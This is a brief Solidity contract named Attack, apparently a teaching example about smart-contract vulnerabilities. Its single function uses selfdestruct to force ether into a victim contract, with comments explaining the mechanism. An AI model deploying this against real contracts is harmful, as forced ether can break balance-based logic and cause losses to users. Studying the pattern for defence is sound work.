// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity 0.8.17;

contract Attack {
    // selfdestruct is used to remove a contracts bytecode from the blockchain hence making it uncallable

    // It can also be used for forcefully sending ether

    function attack(address payable _victim) public {
        selfdestruct(_victim);
    }
}
